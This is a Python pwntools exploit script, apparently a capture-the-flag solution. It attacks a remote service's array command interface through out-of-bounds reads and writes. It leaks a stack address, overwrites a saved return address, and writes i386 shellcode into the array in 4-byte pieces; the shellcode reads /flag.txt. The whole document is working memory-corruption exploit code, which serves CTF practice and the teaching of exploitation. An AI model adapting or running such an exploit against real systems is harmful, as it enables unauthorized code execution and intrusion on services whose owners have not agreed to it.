import pwn
import sys
import struct

r = pwn.remote(sys.argv[1], sys.argv[2])

def unsigned2int(value):
    return struct.unpack('i', pwn.p32(value))[0]

def remote_read(idx):
    r.sendlineafter(b'Command: ', b'r')
    r.sendlineafter(b'Index: ', str(idx).encode())
    r.recvuntil(b'Value: ')
    # parse from Value: 1928843264 (0x72f7d000)
    return int(r.recvline().strip().split(b' ')[1][1:-1], 16)

def remote_write(idx, value):
    r.sendlineafter(b'Command: ', b's')
    r.sendlineafter(b'Index: ', str(idx).encode())
    value = unsigned2int(value)
    r.sendlineafter(b'Value: ', str(value).encode())

def remote_quit():
    r.sendlineafter(b'Command: ', b'q')

# Here we can connect with gdb to see the overall situation
input("Press a key to start the exploit")

stack_leak = remote_read(1030)
print(f"Stack leak: {hex(stack_leak)}")

# to get this offset use gdb to read 1030 (stack leak)
shellcode_address = stack_leak - 4264
print(f"Shellcode address: {hex(shellcode_address)}")
remote_write(1028, shellcode_address)
shellcode = pwn.asm(pwn.shellcraft.i386.linux.cat("/flag.txt") + pwn.shellcraft.i386.linux.exit())
# We are writing 4 bytes at each time, so we need to make sure that the shellcode is a multiple of 4
padding = b'\x90' * (4 - (len(shellcode) % 4))
shellcode = shellcode + padding 
if len(shellcode) % 4 != 0:
    print("Wrong alignment!")
    sys.exit(0)
for i in range(0, len(shellcode), 4):
    remote_write((i//4), pwn.u32(shellcode[i:i+4]))

# Here everything should be done
input("Press a key to quit and trigger the exploit")
remote_quit()

print(r.recvall())